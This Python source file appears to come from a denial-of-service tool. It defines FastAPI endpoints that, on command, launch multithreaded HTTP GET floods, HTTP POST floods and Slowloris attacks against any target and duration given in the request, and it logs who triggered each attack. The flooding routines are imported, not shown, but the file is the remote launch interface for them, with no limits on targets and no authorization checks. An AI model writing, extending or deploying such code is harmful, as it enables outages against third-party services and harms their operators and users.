from fastapi import APIRouter, Request
from src.denialofservice.layer7 import Layer7
from src.globals import NUMBER_OF_THREADS
from threading import Thread
from src.log import log
from src.schemas import HttpGetFloodRequest, HttpPostFloodRequest, SlowlorisFloodRequest

layer7_router = APIRouter()


@layer7_router.post("/httpGETflood")
async def http_get_flood(get_flood: HttpGetFloodRequest, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer7.http_get_flood, args=(get_flood.target, get_flood.time,))
            t.start()
        log.info(
            f"{get_flood.target} HTTP-GET-FLooded from {request.client.host} for {get_flood.time} seconds")
    except:
        log.warning(
            f"{get_flood.target} HTTP-GET-FLood from {request.client.host} for {get_flood.time} seconds could not be triggered")


@layer7_router.post("/httpPOSTflood")
async def http_post_flood(post_flood: HttpPostFloodRequest, request: Request):
    try:
        for i in range(NUMBER_OF_THREADS):
            t = Thread(target=Layer7.http_post_flood,
                       args=(post_flood.target, post_flood.time, post_flood.payload,))
            t.start()
        log.info(
            f"{post_flood.target} HTTP-POST-FLooded from {request.client.host} for {post_flood.time} seconds")
    except:
        log.warning(
            f"{post_flood.target} HTTP-POST-FLood from {request.client.host} for {post_flood.time} seconds could not be triggered")


@layer7_router.post("/slowloris")
async def slow_loris(slow_loris: SlowlorisFloodRequest, request: Request):
    try:
        Layer7.slow_loris(slow_loris.target, slow_loris.port, slow_loris.time)
        log.info(
            f"{slow_loris.target} SLOW-Loris from {request.client.host} for {slow_loris.time} seconds")
    except:
        log.warning(
            f"{slow_loris.target} SlOW-Loris from {request.client.host} for {slow_loris.time} seconds could not be triggered")
